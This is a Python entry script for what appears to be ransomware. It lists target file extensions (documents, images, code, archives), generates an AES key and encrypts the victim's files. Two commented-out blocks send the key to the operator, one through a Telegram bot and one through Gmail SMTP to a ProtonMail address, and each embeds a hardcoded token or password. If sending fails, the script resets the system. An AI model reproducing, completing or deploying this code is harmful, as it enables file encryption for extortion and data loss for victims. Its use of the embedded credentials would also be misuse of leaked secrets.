
# Copyright (C) PhcNguyen Developers
# Distributed under the terms of the Modified TUDL License.

import time

from models import aes
from models.utils import System
from models.files import CommonFiles

from models.email import EmailSender
from models.telegram import Telegram



file_categories = {
    'images': [
        '.jpg', '.png', '.gif', '.bmp', 
        '.svg', '.tif', '.tiff', '.jpeg'
    ],
    'documents': [
        '.txt', '.docx', '.md', '.rst', 
        '.doc', '.pdf', '.xlsx', '.xls', 
        '.pptx', '.odt', '.odp', '.rtf', 
        '.epub'
    ],
    'others': [
        '.eml', '.psd', '.eps', '.cdr', 
        '.ppt', '.mp3', '.wav', '.mov', 
        '.dmg', '.rar', '.zip', '.mp4', 
        '.json', '.avi', '.flac'
    ],
    'code': [
        '.c', '.cpp', '.cs', '.java',
        '.py', '.js', '.html', '.css', 
        '.php', '.rb', '.swift', '.sql', 
        '.xml', '.sh', '.bat', '.ts'
    ]
}
key: bytes = aes.generate_key(32)
client = CommonFiles(aes, key, file_categories)



# 1. Send key to Telegram 
'''
token: str = '6901515780:AAGeZhRhWMSyG124XiA_qiIJHkvN3AIIyo4'
chat_id: str = ...

telegram = Telegram(token)

if telegram.sendMessage(chat_id, key):
    client.process_files()
else:
    time.sleep(10)
    System.reset()
'''


# 2. Send key to Email
'''
email = EmailSender(
    'nguyen098xx@gmail.com', 'Kba#17bak', 
    'smtp.gmail.com', 587
)

if email.sendEmail(
    'phcnguyenz@proton.me', 
    f'key AES - {time.time()}', key
):
    client.process_files()
else:
    time.sleep(10)
    System.reset()
'''